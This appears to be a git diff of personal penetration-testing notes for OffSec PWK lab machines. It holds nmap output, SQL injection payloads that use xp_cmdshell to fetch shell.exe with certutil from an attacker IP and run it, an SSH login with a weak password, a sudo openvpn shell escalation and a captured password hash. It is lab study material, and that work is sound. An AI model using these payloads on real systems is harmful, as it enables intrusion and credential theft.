@@ -1,5 +1,5 @@
 # VM 3
-- ?
+- WEB01
 - ```
     PORT   STATE SERVICE VERSION
     22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
@@ -11,7 +11,6 @@
     |_http-title: PAW! (PWK Awesome Website)
     |_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
   ```
 ## Foothold
 
@@ -25,7 +24,7 @@
 - Ez SQLi
     ``` 
     ';EXEC master.dbo.xp_cmdshell 'ping 192.168.45.219';--
-    ';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.45.219/shell.exe C:\\Windows\temp\shell.exe';--
+    ';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.45.201/shell.exe C:\\Windows\temp\shell.exe';--
     ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
     ```
 ## Root 
@@ -70,8 +69,8 @@
                 cloudap :
         ```
 
-# VM 5
-- ?
+# VM 5 (pwned)
+- VPN
 - ```
     PORT     STATE SERVICE  VERSION
     22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
@@ -80,4 +79,20 @@
     |_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
     1194/tcp open  openvpn?
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  ```
+## Foothold
+```
+    ssh offsec@192.168.244.122
+    password
+```
+
+## Root?
+- Get runable sudo in ``` history ``` LOLL...
+- ```
+    sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+  ```
+
+## Interesting Info
+  ```
+  mario:$y$j9T$WlF.5NfkOQ2xN4K9OPM2e1$X/wrPHU0zaz.dGUjFQGLj5nbrTfNpy0Hm6Xev04aUw8:19268:0:99999:7:::
   ```
